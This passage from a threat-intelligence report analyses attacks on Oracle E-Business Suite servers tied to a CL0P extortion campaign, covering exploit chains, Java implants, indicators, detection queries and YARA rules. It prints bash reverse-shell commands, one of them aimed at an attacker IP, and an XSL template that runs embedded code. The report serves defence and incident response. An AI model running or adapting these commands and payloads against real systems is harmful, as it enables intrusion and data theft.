class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Extortion email sent to victim executives\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/oracle-cl0p-fig2.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 2: Extortion email sent to victim executives</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Technical Analysis: Deconstructing the Exploits</span></h4>\n<p><span style=\"vertical-align: baseline;\">We have identified exploitation activity targeting Oracle E-Business Suite (EBS) servers occurring prior to the recent extortion campaign, likely dating back to July 2025.</span></p>\n<p><span style=\"vertical-align: baseline;\">Oracle released a patch on Oct. 4 for CVE-2025-61882, which referenced a leaked exploit chain targeting the </span><code style=\"vertical-align: baseline;\">UiServlet</code><span style=\"vertical-align: baseline;\"> component, but Mandiant has observed multiple different exploit chains involving Oracle EBS and it is likely that a different chain was the basis for the Oct. 2 advisory that originally suggested a known vulnerability was being exploited. It's currently unclear which specific vulnerabilities/exploit chains correspond to CVE-2025-61882, however, GTIG assesses that Oracle EBS servers updated through the patch released on Oct. 11 are likely no longer vulnerable to known exploitation chains.</span></p>\n<h5><span style=\"vertical-align: baseline;\">July 2025 Activity: Suspicious Activity Involving 'UiServlet'</span></h5>\n<p><span style=\"vertical-align: baseline;\">Mandiant incident responders identified activity in July 2025 targeting Oracle EBS servers where application logs suggested exploitation targeting </span><code style=\"vertical-align: baseline;\">/OA_HTML/configurator/UiServlet</code><span style=\"vertical-align: baseline;\">. The artifacts recovered in Mandiant's investigations do have some overlap with an exploit leaked in a Telegram group named “SCATTERED LAPSUS$ HUNTERS” on October 3rd, 2025. However, GTIG lacks sufficient evidence to directly correlate activity observed in July 2025 with use of this exploit. At this time, GTIG does not assess that actors associated with UNC6240 (aka \"Shiny Hunters\") were involved in this exploitation activity. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The leaked exploit, as analyzed by </span><a href=\"https://labs.watchtowr.com/well-well-well-its-another-day-oracle-e-business-suite-pre-auth-rce-chain-cve-2025-61882well-well-well-its-another-day-oracle-e-business-suite-pre-auth-rce-chain-cve-2025-61882/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">watchTowr Labs</span></a><span style=\"vertical-align: baseline;\">, combines several distinct primitives including Server-Side Request Forgery (SSRF), Carriage-Return Line-Feed (CRLF) injection, authentication bypass, and XSL template injection, to gain remote code execution on the target Oracle EBS server. As mentioned, it's not clear which CVE corresponds to any of the vulnerabilities exploited in this chain. Any commands executed following exploitation would use </span><code style=\"vertical-align: baseline;\">sh</code><span style=\"vertical-align: baseline;\"> on Linux, or </span><code style=\"vertical-align: baseline;\">cmd.exe</code><span style=\"vertical-align: baseline;\"> on Windows.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The leaked exploit archive included sample invocations showing its use for executing a Bash reverse shell, with a command structured like </span><code style=\"vertical-align: baseline;\">bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n</ul>\n<h5><span style=\"vertical-align: baseline;\">Activity Observed Before July 2025 Patch Release</span></h5>\n<p><span style=\"vertical-align: baseline;\">On July 10th, prior to the release of the July 2025 Oracle EBS security updates, Mandiant identified suspicious HTTP traffic from </span><code style=\"vertical-align: baseline;\">200.107.207.26</code><span style=\"vertical-align: baseline;\">. GTIG was unable to confirm the exact nature of this activity, but it's plausible that this was an early attempt at exploitation of Oracle EBS servers. However, there was no available forensic evidence showing outbound HTTP traffic consistent with the remote XSL payload retrieval performed in the leaked exploit, nor any suspicious commands observed being executed, inhibiting us from assessing that this was an actual exploitation attempt.</span></p>\n<p><span style=\"vertical-align: baseline;\">Additionally, Internet scan data showed that server exposing a Python AIOHTTP server at approximately the same time as the aforementioned activity, which is consistent with use of the callback server in the publicly leaked exploit.</span></p>\n<h5><span style=\"vertical-align: baseline;\">Activity Observed After July 2025 Patch Release</span></h5>\n<p><span style=\"vertical-align: baseline;\">After the patches were released, Mandiant observed likely exploitation attempts from </span><code style=\"vertical-align: baseline;\">161.97.99.49</code><span style=\"vertical-align: baseline;\"> against Oracle EBS servers, with HTTP requests for </span><code style=\"vertical-align: baseline;\">/OA_HTML/configurator/UiServlet</code><span style=\"vertical-align: baseline;\"> recorded. Notably, various logs involving EBS indicate that some of these requests timed out, suggesting the SSRF vulnerability present in the leaked public exploit, or follow-on activity that would've cleanly closed the request, may have failed. These errors were not observed in the activity recorded prior to the July 2025 patch release.</span></p>\n<p><span style=\"vertical-align: baseline;\">GTIG is not currently able to confirm if both of these sets of activity were conducted by the same threat actor or not.</span></p>\n<h5><span style=\"vertical-align: baseline;\">August 2025 Activity: Exploit Chain Targeting 'SyncServlet'</span></h5>\n<p><span style=\"vertical-align: baseline;\">In August 2025, a threat actor began exploiting a vulnerability in the </span><code style=\"vertical-align: baseline;\">SyncServlet</code><span style=\"vertical-align: baseline;\"> component, allowing for unauthenticated remote code execution. This activity originated from multiple threat actor servers, including </span><code style=\"vertical-align: baseline;\">200.107.207.26</code><span style=\"vertical-align: baseline;\">, as observed in the aforementioned activity.</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Exploit Flow</strong><span style=\"vertical-align: baseline;\">: The attack is initiated with a </span><code style=\"vertical-align: baseline;\">POST</code><span style=\"vertical-align: baseline;\"> request to </span><code style=\"vertical-align: baseline;\">/OA_HTML/SyncServlet</code><span style=\"vertical-align: baseline;\">. The actor then uses the XDO Template Manager functionality to create a new, malicious template within the EBS database. The final stage of the exploit is a request that triggers the payload via the Template Preview functionality. A request to the following endpoint is a high-fidelity indicator of compromise:</span></li>\n</ul></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>/OA_HTML/OA.jsp?page=/oracle/apps/xdo/oa/template/webui/TemplatePreviewPG&amp;TemplateCode=&lt;TMP|DEF&gt;&lt;16_RANDOM_HEX_STRING&gt;&amp;TemplateType=&lt;XSL-TEXT|XML&gt;…</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The malicious payload is stored as a new template in the </span><code style=\"vertical-align: baseline;\">XDO_TEMPLATES_B</code><span style=\"vertical-align: baseline;\"> database table. The template name (</span><code style=\"vertical-align: baseline;\">TemplateCode</code><span style=\"vertical-align: baseline;\">) consistently begins with the prefix </span><code style=\"vertical-align: baseline;\">TMP</code><span style=\"vertical-align: baseline;\"> or </span><code style=\"vertical-align: baseline;\">DEF</code><span style=\"vertical-align: baseline;\">, and the </span><code style=\"vertical-align: baseline;\">TemplateType</code><span style=\"vertical-align: baseline;\"> is set to </span><code style=\"vertical-align: baseline;\">XSL-TEXT</code><span style=\"vertical-align: baseline;\"> or </span><code style=\"vertical-align: baseline;\">XML</code><span style=\"vertical-align: baseline;\">, respectively. The following is an example of a payload stored in database with the Base64 payload redacted:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n    &lt;xsl:stylesheet version=\"1.0\"\n                    xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n                    xmlns:b64=\"http://www.oracle.com/XSL/Transform/java/sun.misc.BASE64Decoder\"\n                    xmlns:jsm=\"http://www.oracle.com/XSL/Transform/java/javax.script.ScriptEngineManager\"\n                    xmlns:eng=\"http://www.oracle.com/XSL/Transform/java/javax.script.ScriptEngine\"\n                    xmlns:str=\"http://www.oracle.com/XSL/Transform/java/java.lang.String\"&gt;\n        &lt;xsl:template match=\"/\"&gt;\n            &lt;xsl:variable name=\"bs\" select=\"b64:decodeBuffer(b64:new(),'&lt;BASE64STRING&gt;')\"/&gt;\n            &lt;xsl:variable name=\"js\" select=\"str:new($bs)\"/&gt;\n            &lt;xsl:variable name=\"m\" select=\"jsm:new()\"/&gt;\n            &lt;xsl:variable name=\"e\" select=\"jsm:getEngineByName($m, 'js')\"/&gt;\n            &lt;xsl:variable name=\"code\" select=\"eng:eval($e, $js)\"/&gt;\n            &lt;xsl:value-of select=\"$code\"/&gt;\n        &lt;/xsl:template&gt;\n    &lt;/xsl:stylesheet&gt;</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Notably, the structure of this XSL payload is identical to the XSL payload in the leaked Oracle EBS exploit previously discussed.</span></p>\n<p><span style=\"vertical-align: baseline;\">GTIG has identified at least two different chains of Java payloads embedded in the XSL payloads, some of which has also been discussed </span><a href=\"https://blog.dingusxmcgee.com/blog/2025/10/06/Its-Java-All-The-Way-Down.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">:</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">GOLDVEIN.JAVA - Downloader</strong><span style=\"vertical-align: baseline;\">: A Java variant of GOLDVEIN, a downloader that makes a request back to an attacker-controlled command-and-control (C2 or C&amp;C) IP address to retrieve and execute a second-stage payload. This beacon is disguised as a \"TLSv3.1\" handshake and contains logging functionality that returns the execution result to the actor in the HTTP response, within an HTML comment. Mandiant hasn't recovered any follow-on payloads downloaded by GOLDVEIN.JAVA at this time.</span>\n<ul>\n<li><span style=\"vertical-align: baseline;\">GOLDVEIN was originally written in PowerShell and was first observed in the exploitation campaign of multiple Cleo software products in December 2024 by a suspected FIN11 threat cluster tracked as UNC5936.</span></li>\n</ul>\n</li>\n<li><strong style=\"vertical-align: baseline;\">SAGE* Infection Chain</strong><span style=\"vertical-align: baseline;\">: A nested chain of multiple Java payloads resulting in a persistent filter that monitors for requests to endpoints containing </span><code style=\"vertical-align: baseline;\">/help/state/content/destination./navId.1/navvSetId.iHelp/</code><span style=\"vertical-align: baseline;\"> to deploy additional Java payloads.</span>\n<ul>\n<li><span style=\"vertical-align: baseline;\">The XSL payload contains a Base64-encoded </span><strong style=\"vertical-align: baseline;\">SAGEGIFT</strong><span style=\"vertical-align: baseline;\"> payload. SAGEGIFT is a custom Java reflective class loader, written for Oracle WebLogic servers.</span></li>\n<li><span style=\"vertical-align: baseline;\">SAGEGIFT is used to load </span><strong style=\"vertical-align: baseline;\">SAGELEAF</strong><span style=\"vertical-align: baseline;\">, an in-memory dropper based on </span><a href=\"https://github.com/ReaJason/MemShellParty/blob/0c041ee1a97b1af1d677f2d2bc47f325d278da3e/generator/src/main/java/com/reajason/javaweb/memshell/injector/weblogic/WebLogicFilterInjector.java\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">public code</span></a><span style=\"vertical-align: baseline;\"> for reflectively loading Oracle WebLogic servlet filters, with additional logging code embedded in it. Logs in SAGELEAF are retrieved by the parent SAGEGIFT payload that loaded it, and they can be returned to the actor in the HTTP response within an HTML comment (structured the same way as GOLDVEIN.JAVA).</span></li>\n<li><span style=\"vertical-align: baseline;\">SAGELEAF is used to install </span><strong style=\"vertical-align: baseline;\">SAGEWAVE</strong><span style=\"vertical-align: baseline;\">, a malicious Java servlet filter that allows the actor to deploy an AES-encrypted ZIP archive with Java classes in it. Based on our analysis, there is a main payload of SAGEWAVE that may be similar to the </span><code style=\"vertical-align: baseline;\">Cli</code><span style=\"vertical-align: baseline;\"> module of GOLDTOMB; however, at this time we have not directly observed this final stage.</span></li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Mandiant has observed variants of SAGEWAVE where the HTTP header </span><code style=\"vertical-align: baseline;\">X-ORACLE-DMS-ECID</code><span style=\"vertical-align: baseline;\"> must be set to a specific, hardcoded value for the request payload to be processed, and has also seen different HTTP paths used for request filtering, including </span><code style=\"vertical-align: baseline;\">/support/state/content/destination./navId.1/navvSetId.iHelp/</code>.</span></li>\n</ul>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"SAGE* infection chain/trigger diagram\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/oracle-cl0p-fig3.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 3: SAGE* infection chain/trigger diagram</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Following successful exploitation, the threat actor has been observed executing reconnaissance commands from the EBS account \"</span><strong style=\"vertical-align: baseline;\">applmgr</strong><span style=\"vertical-align: baseline;\">.\" These commands include:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>cat /etc/fstab\ncat /etc/hosts\ndf -h\nip addr\ncat /proc/net/arp\n\n/bin/bash -i &gt;&amp; /dev/tcp/200.107.207.26/53 0&gt;&amp;1\narp -a\nifconfig\nnetstat -an\nping 8.8.8.8 -c 2\nps -aux</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Furthermore, Mandiant observed the threat actor launching additional bash processes from Java (EBS process running a GOLDVEIN.JAVA second-stage payload) using </span><code style=\"vertical-align: baseline;\">bash -i</code><span style=\"vertical-align: baseline;\"> and then executing various commands from the newly launched bash process. Child processes of any </span><code style=\"vertical-align: baseline;\">bash -i</code><span style=\"vertical-align: baseline;\"> process launched by Java running as the EBS account “</span><strong style=\"vertical-align: baseline;\">applmgr</strong><span style=\"vertical-align: baseline;\">” should be reviewed as part of hunting for threat actor commands.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Attribution: Overlaps with Confirmed and Suspected FIN11 Activity</span></h3>\n<p><span style=\"vertical-align: baseline;\">GTIG has not formally attributed this activity to a tracked threat group at this time. The use of the CL0P extortion brand, including contact addresses (support@pubstorm.com and support@pubstorm.net) that have been listed on the CL0P DLS since at least May 2025, is however notable. GTIG initially observed the DLS used for multifaceted extortion operations involving CL0P ransomware and attributed to FIN11. More recently, the majority of the alleged victims appear to be associated with data theft extortion incidents stemming from the exploitation of managed file transfer (MFT) systems frequently attributed to FIN11 and suspected FIN11 threat clusters. However, we have also observed evidence that CL0P ransomware, and the CL0P DLS has not been exclusively used by FIN11, precluding our ability to attribute based only on this factor. </span></p>\n<p><span style=\"vertical-align: baseline;\">In addition to the CL0P overlap, the post-exploitation tooling shows logical similarities to malware previously used in a suspected FIN11 campaign. Specifically, the use of the in-memory Java-based loader GOLDVEIN.JAVA that fetches a second-stage payload is reminiscent of the GOLDVEIN downloader and GOLDTOMB backdoor, which were deployed by the suspected FIN11 cluster UNC5936 during the mass exploitation of the Cleo MFT vulnerability in late 2024. Further, one of the compromised accounts used to send the recent extortion emails was previously used by FIN11. Ongoing analysis may reveal more details about the relationship between this recent activity and other threat clusters—such as FIN11 and UNC5936.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Implications</span></h3>\n<p><span style=\"vertical-align: baseline;\">The pattern of exploiting a zero-day vulnerability in a widely used enterprise application, followed by a large-scale, branded extortion campaign weeks later, is a hallmark of activity historically attributed to FIN11 that has strategic benefits which may also appeal to other threat actors. Targeting public-facing applications and appliances that store sensitive data likely increases the efficiency of data theft operations, given that the threat actors do not need to dedicate time and resources to lateral movement. This overall approach—in which threat actors have leveraged zero-day vulnerabilities, limited their network footprint, and delayed extortion notifications—almost certainly increases the overall impact, given that threat actors may be able to exfiltrate data from numerous organizations without alerting defenders to their presence. CL0P-affiliated actors almost certainly perceive these mass exploitation campaigns as successful, given that they've employed this approach since at least late 2020. We therefore anticipate that they will continue to dedicate resources to acquiring zero-day exploits for similar applications for at least the near-term. </span></p>\n<h3><span style=\"vertical-align: baseline;\">Recommendations</span><strong style=\"vertical-align: baseline;\"> </strong></h3>\n<p><span style=\"vertical-align: baseline;\">GTIG and Mandiant recommend the following actions to mitigate and detect the threats posed by this activity and harden Oracle E-Business Suite environments:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Apply emergency patches immediately</strong><span style=\"vertical-align: baseline;\">: Prioritize the application of the Oracle EBS patches released on Oct. 4, 2025, which mitigate the described exploitation activity (CVE-2025-61882). Given the active, in-the-wild exploitation, this is the most critical step to prevent initial access.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hunt for malicious templates in the database</strong><span style=\"vertical-align: baseline;\">: The threat actor(s) store payloads directly in the EBS database. Administrators should immediately query the </span><code style=\"vertical-align: baseline;\">XDO_TEMPLATES_B</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">XDO_LOBS</code><span style=\"vertical-align: baseline;\"> tables to identify malicious templates. Review any templates where the </span><code style=\"vertical-align: baseline;\">TEMPLATE_CODE</code><span style=\"vertical-align: baseline;\"> begins with </span><code style=\"vertical-align: baseline;\">TMP</code><span style=\"vertical-align: baseline;\"> or </span><code style=\"vertical-align: baseline;\">DEF</code><span style=\"vertical-align: baseline;\">. The payload is stored in the </span><code style=\"vertical-align: baseline;\">LOB_CODE</code><span style=\"vertical-align: baseline;\"> column.</span></p>\n</li>\n</ul></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>SELECT * FROM XDO_TEMPLATES_B ORDER BY CREATION_DATE DESC;\nSELECT * FROM XDO_LOBS ORDER BY CREATION_DATE DESC;</code></pre></div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Restrict outbound internet access</strong><span style=\"vertical-align: baseline;\">: The observed Java payloads require outbound connections to C2 servers to fetch second-stage implants or exfiltrate data. Block all non-essential outbound traffic from EBS servers to the internet. This is a compensating control that can disrupt the attack chain even if a server is compromised.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Monitor and analyze network logs</strong><span style=\"vertical-align: baseline;\">: Monitor for indicators of compromise. A request to the </span><code style=\"vertical-align: baseline;\">TemplatePreviewPG</code><span style=\"vertical-align: baseline;\"> endpoint containing a </span><code style=\"vertical-align: baseline;\">TemplateCode</code><span style=\"vertical-align: baseline;\"> prefixed with </span><code style=\"vertical-align: baseline;\">TMP</code><span style=\"vertical-align: baseline;\"> or </span><code style=\"vertical-align: baseline;\">DEF</code><span style=\"vertical-align: baseline;\"> is a strong indicator of an exploitation attempt. Additionally, investigate anomalous requests to </span><code style=\"vertical-align: baseline;\">/OA_HTML/configurator/UiServlet</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">/OA_HTML/SyncServlet</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Leverage memory forensics</strong><span style=\"vertical-align: baseline;\">: The implants used in this campaign are primarily Java-based and execute in memory. If a compromise is suspected, memory analysis of the Java processes associated with the EBS application may reveal malicious code or artifacts not present on disk.</span></p>\n</li>\n</ul>\n<h3>Acknowledgments </h3>\n<p>This analysis would not have been possible without the assistance from across Google Threat Intelligence Group and Mandiant Consulting. We would also like to specifically thank Genwei Jiang and Elliot Chernofsky from FLARE. </p>\n<h3><span style=\"vertical-align: baseline;\">Indicators of Compromise</span></h3>\n<p><span style=\"vertical-align: baseline;\">The <a href=\"https://www.virustotal.com/gui/collection/eee0f14fb778dd14962aedf6c10b499efcc6a98ee38b6da3b173270156d6d9f4\" rel=\"noopener\" target=\"_blank\">following indicators of compromise are available</a> in a Google Threat Intelligence (GTI) collection for registered users.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Type</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Indicator</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Network</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">200.107.207.26</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">IP address observed in exploitation attempts targeting the </span><span style=\"vertical-align: baseline;\">UiServlet</span><span style=\"vertical-align: baseline;\"> and </span><span style=\"vertical-align: baseline;\">SyncServlet</span><span style=\"vertical-align: baseline;\"> components.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Network</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">161.97.99.49</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">IP address observed in exploitation attempts targeting the </span><span style=\"vertical-align: baseline;\">UiServlet</span><span style=\"vertical-align: baseline;\"> component</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Network</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">162.55.17.215:443</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">GOLDVEIN.JAVA C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Network</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">104.194.11.200:443</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">GOLDVEIN.JAVA C2</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Network</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">/OA_HTML/OA.jsp?page=/oracle/apps/xdo/oa/template/webui/TemplatePreviewPG...</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Indicator of an attempt to trigger the malicious XSL payload. Look for requests where </span><span style=\"vertical-align: baseline;\">TemplateCode</span><span style=\"vertical-align: baseline;\"> begins with </span><span style=\"vertical-align: baseline;\">TMP</span><span style=\"vertical-align: baseline;\"> or </span><span style=\"vertical-align: baseline;\">DEF</span><span style=\"vertical-align: baseline;\">.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Network</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">/OA_HTML/configurator/UiServlet</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Endpoint targeted in the July 2025 exploitation activity.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Network</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">/OA_HTML/SyncServlet</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Endpoint targeted in the August 2025 exploitation activity.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Network</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">/help/state/content/destination./navId.1/navvSetId.iHelp/</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">HTTP path substring filtered for by SAGEWAVE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Network</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">/support/state/content/destination./navId.1/navvSetId.iHelp/</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">HTTP path substring filtered for by SAGEWAVE</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Email</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">support@pubstorm.com</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Contact address used in the CL0P extortion emails and listed on the group's data leak site.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Email</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">support@pubstorm.net</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Contact address used in the CL0P extortion emails and listed on the group's data leak site.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h3>YARA Rules</h3></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_Downloader_GOLDVEIN_JAVA_1 {\n\tmeta:\n\t\tauthor = \"Google Threat Intelligence Group (GTIG)\"\n\tstrings:\n\t\t$chunk1 = \"175,121,73\" base64\n\t\t$chunk2 = \"249,254,255\" base64\n\t\t$chunk3 = \"235,176,29\" base64\n\t\t$chunk4 = \"242,61,32\" base64\n\t\t$chunk5 = \"189,66,134\" base64\n\t\t$str1 = \"java.net.Socket(h,443)\" base64\n\t\t$str2 = \"TLSv3.1\" base64\n\t\t$decoded1 = \"[175,121,73,249,254,255,235,176,29,242,61,32,189,66,134,102,56,208,18,10,132,242,223,202,90,97,118,3,83,136,84,213]\"\n\t\t$decoded2 = \"java.net.Socket(h,443)\"\n\t\t$decoded3 = \"TLSv3.1\"\n\tcondition:\n\t\t(3 of ($chunk*) and all of ($str*)) or all of ($decoded*)\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_Dropper_SAGEGIFT_1 {\n\tmeta:\n\t\tauthor = \"Google Threat 